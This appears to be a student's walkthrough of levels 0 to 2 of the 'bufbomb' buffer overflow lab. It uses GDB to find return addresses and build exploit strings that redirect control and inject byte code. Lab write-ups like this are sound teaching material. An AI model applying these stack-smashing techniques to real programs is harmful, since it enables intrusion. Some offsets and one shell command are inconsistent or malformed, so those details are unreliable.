# Level 0: Smoke

The video provided in the specification pretty much walks through this phase. Pretty much used GDB to set a breakpoint
after the call to "gets" in bufbomb.c (line 136). This call is where we will use buffer overflow to accomplish our evil intentions.
Then we can run the program:

```
gdb bufbomb
break 137
run -u zmcnulty
<type in some random string>
x/20gx $rsp   # to view the stack
info frame    # to get info on the return address of the frame; we can see from the above input where in the stack this return address is stored
print smoke   # to get the call address for smoke()
```

Then it is as simple as choosing a string that overflows all the way to the return address (0x400ef3) and overwrites it with the call address of smoke (0x4010c0). This is
what we use sendstring for.



# Level 1: Fizz

Again using the info frame command and printing the stack:

```
gdb bufbomb
break 137
run -u zmcnulty
<type some random string>
info frame
x/20gx $rsp
```

We4 can see that the arglist for the current frame is stored at 0x7ffffffeb980 and is currently empty. Here we want
to add our cookie as an arg as well as overriding the return address (same as we did in level 0 above) to point to the call
address of fizz (0x401070; ran `print fizz` to find this). So we know the first part of our string will be 48 random characters (to overflow the buffer and get to the return address)
followed by the new desired return address (70 10 40 00 00 00 00 00 where order is reversed as characters are added from low address to high). Once we return this lower frame will be
thrown away so its contents do not matter besides the return address. Once we return, we will be left in the fizz function. Fizz's 7th argument will be stored on the stack.
Here is what the normal stack looks like:


```
0x7ffffffeb950: 0x617266206f666e69      0x000000000000656d          # %rsp (frame 0) --> start of the buffer/string input
0x7ffffffeb960: 0x0000000000000000      0x0000000000000000          # more alloted space for string input
0x7ffffffeb970: 0x0000000000000000      0x0000000000000000
0x7ffffffeb980: 0x00007ffffffeb9b0      0x0000000000400ef3          # saved %rbp for previous frame (from test function) // return address
0x7ffffffeb990: 0x0000000000000000      0x00000000deadbeef              # arguments for function being called (0x0 = empty string = no args) // ???
0x7ffffffeb9a0: 0x000000007a7e162d      0x000000007a7e162d
0x7ffffffeb9b0: 0x00007ffffffee510      0x0000000000400fdd          # (frame 1): saved %rbp for previous frame // return address
0x7ffffffeb9c0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffeb9d0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffeb9e0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

Then we can see that 0xdeadbeef is where the 7th argument would be passed. Hence we overwrite it with our cookie in the exploit string.



# Level 2: Bang

First, we find the address of the global variable `global_value` in the following way:

```
gdb bufbomb
info address global_value
```

which returns the address `0x602308`. We also want to find the call address of the bang() function which we can do as folows:

```
gdb bufbomb
print bang
```

which yields the address `0x401020`. So we want our exploit string to first overwrite the return address of getbuf (currently 0x400ef3) and set it to the beginning of
our exploit code (which we will store in the stack), then adjust the value of global_value, then return to the bang() function.

The exploit code is simple enough, just some mov commands and pushing the call address of bang() onto the stack. You can see this in the bang_code.s file. Following the instructions in the lab
for "Generating Byte Codes" we can generate the byte code (this can be seen in bomb_code.d). We will store this as the first part of our string (again, the byte code will have to be reversed because
the stack is read from lower addresses to higher, as mentioned in the bottom of the generating byte codes section).
The exploit code is fairly short and fits in the allotted buffer created by getbuf. Hence we can store it before the return address, and then just overwrite the return
address on the stack to point to the start of this code. We append a bunch of filler characters to our byte code
until it is 56 characters long. Then the next byte will overwrite the return address (0x400ef3 below) Again with GDB:


```
gdb bufbomb
break 137
run -u zmcnulty
x/20gx $rsp
```

Shows us the stack:

```
0x7ffffffeb950: 0x617266206f666e69      0x000000000000656d          # %rsp (frame 0) --> start of the buffer/string input
0x7ffffffeb960: 0x0000000000000000      0x0000000000000000          # more alloted space for string input
0x7ffffffeb970: 0x0000000000000000      0x0000000000000000
0x7ffffffeb980: 0x00007ffffffeb9b0      0x0000000000400ef3          # saved %rbp for previous frame (from test function) // return address
0x7ffffffeb990: 0x0000000000000000      0x00000000deadbeef              # arguments for function being called (0x0 = empty string = no args) // ???
0x7ffffffeb9a0: 0x000000007a7e162d      0x000000007a7e162d
0x7ffffffeb9b0: 0x00007ffffffee510      0x0000000000400fdd          # (frame 1): saved %rbp for previous frame // return address
0x7ffffffeb9c0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffeb9d0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
We can see the stack starts at 0x7ffffffeb950. Since our exploit code is 24 bytes, it will take up the first 
three addresses. Namely, it will start at line 0x7ffffffeb960. Thus, this is the desired address we will replace the return address with.

To run this code in GDB, as mentioned in the lab specification, we run the following:


```
cat bang.txt | ./sendstring | > bang_string.txt   # convert our hex-encoded string to ascii
gdb bufbomb
run -u zmcnulty < bang_string.txt                 # pass the exploit string to bufbomb through stdin
```

It was helpful to debug through this as well (include a `break 137` line before the run line; then we can view the stack and frame info as before
using `x/20gx $rsp` and `info frame` respectively).

